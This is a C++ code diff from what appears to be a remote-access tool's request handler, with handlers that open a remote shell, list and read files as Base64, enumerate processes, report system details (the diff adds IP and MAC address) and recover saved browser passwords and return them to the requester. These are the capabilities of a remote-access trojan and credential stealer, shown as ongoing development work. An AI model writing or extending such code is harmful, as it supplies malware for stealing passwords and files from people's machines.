@@ -103,7 +103,7 @@ namespace rslm {
                         Reply(request, {
                             {"status", "open"},
                             {"prompt", messages::RemoteShellHandler::GetPrompt()}
-                        });
+                            });
                     }
                     else {
                         ReplyError(request, "Failed to open shell");
@@ -145,7 +145,7 @@ namespace rslm {
                                     {"path", f.path},
                                     {"type", f.type == FileType::Directory ? "directory" : "file"},
                                     {"size", f.size}
-                                });
+                                    });
                             }
                             Reply(request, { {"files", arr} });
                         });
@@ -159,7 +159,7 @@ namespace rslm {
                                 {"path", p.value("path", std::string())},
                                 {"data", util::Base64Encode(data)},
                                 {"size", data.size()}
-                            });
+                                });
                         });
                     return;
                 }
@@ -205,7 +205,7 @@ namespace rslm {
                                     {"windowTitle", proc.windowTitle},
                                     {"memoryUsage", proc.memoryUsage},
                                     {"threads", proc.threads}
-                                });
+                                    });
                             }
                             Reply(request, { {"processes", arr} });
                         });
@@ -267,8 +267,10 @@ namespace rslm {
                                 {"totalRam", info.totalRam},
                                 {"availableRam", info.availableRam},
                                 {"gpu", info.gpu},
-                                {"isAdmin", info.isAdmin}
-                            });
+                                {"isAdmin", info.isAdmin},
+                                {"ipAddress", info.ipAddress},
+                                {"macAddress", info.macAddress}
+                                });
                         });
                     return;
                 }
@@ -284,10 +286,10 @@ namespace rslm {
                                 {"username", pw.username},
                                 {"password", pw.password},
                                 {"application", pw.application}
-                            });
+                                });
                         }
                         Reply(request, { {"passwords", arr} });
-                    };
+                        };
 
                     if (mode == "browsers")
                         messages::PasswordRecoveryHandler::RecoverBrowsers(callback);
